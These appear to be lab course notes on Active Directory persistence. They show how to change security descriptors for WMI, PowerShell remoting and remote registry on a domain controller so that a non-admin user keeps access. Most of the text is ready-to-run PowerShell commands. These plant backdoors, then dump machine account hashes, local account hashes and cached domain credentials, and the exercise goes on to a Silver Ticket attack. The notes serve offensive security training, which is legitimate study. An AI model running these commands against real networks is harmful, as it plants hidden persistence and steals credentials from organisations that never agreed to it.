# Security Descriptors

• It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users. 

• Administrative privileges are required for this.

• It, of course, works as a very useful and impactful backdoor mechanism.

•Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and `SACL:ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`

•ACE for built-in administrators for WMI namespaces `A;CI;CCDCLCSWRPWPRCWD;;;SID`

ACLs can be modified to allow non-admin users access to securable objects.

# Security Descriptors WMI

#### On local machine for student1:
```powershell
Set-RemoteWMI -UserName student1 -Verbose
```

#### On remote machine for student1 without explicit credentials:
```powershell
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

#### On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
```powershell
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Credential Administrator –namespace 'root\cimv2' -Verbose
```

#### On remote machine remove permissions:
```powershell
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose
```

# Security Descriptors PowerShell Remoting

#### On local machine for student1:
```powershell
Set-RemotePSRemoting -UserName student1 -Verbose
```

#### On remote machine for student1 without credentials:
```powershell
Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Verbose
```

#### On remote machine, remove the permissions:
```powershell
Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Remove
```

# Security Descriptors Remote Registry

#### Using DAMP, with admin privs on remote machine
```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose 
```

#### As student1, retrieve machine account hash: 
```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose 
```

#### Retrieve local account hash: 
```powershell
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose 
```

#### Retrieve domain cached credentials: 
```powershell
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

# Learning Objective 13

• Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access. 

• Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.